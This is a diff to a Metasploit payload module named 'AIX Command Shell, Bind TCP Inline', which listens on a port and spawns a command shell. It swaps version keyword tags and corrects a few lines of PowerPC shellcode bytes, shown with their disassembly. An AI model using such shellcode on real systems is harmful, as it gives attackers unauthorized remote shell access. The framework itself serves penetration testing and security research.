@@ -1,5 +1,5 @@
 ##
-# $Id: shell_bind_tcp.rb 5663 2008-09-17 01:42:51Z ramon $
+# $Id$
 ##
 
 ##
@@ -22,7 +22,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'AIX Command Shell, Bind TCP Inline',
-			'Version'       => '$Revision: 5663 $',
+			'Version'       => '$Revision$',
 			'Description'   => 'Listen for a connection and spawn a command shell',
 			'Author'        => 'Ramon de Carvalho Valle <ramon@risesecurity.org>',
 			'License'       => MSF_LICENSE,
@@ -146,7 +146,8 @@ module Metasploit3
 		"\x40\x82\xff\xfd"     +#   bnel    <bndsockcode+208>          #
 		"\x7f\x08\x02\xa6"     +#   mflr    r24                        #
 		"\x3b\x18\x01\xff"     +#   cal     r24,511(r24)               #
-		"\x38\x78\xfe\x25"     +#   cal     r3,-475(r24)               #
+		"\x38\x78\xfe\x29"     +#   cal     r3,-471(r24)               #
+		"\x98\xb8\xfe\x31"     +#   stb     r5,-463(r24)               #
 		"\x94\xa1\xff\xfc"     +#   stu     r5,-4(r1)                  #
 		"\x94\x61\xff\xfc"     +#   stu     r3,-4(r1)                  #
 		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
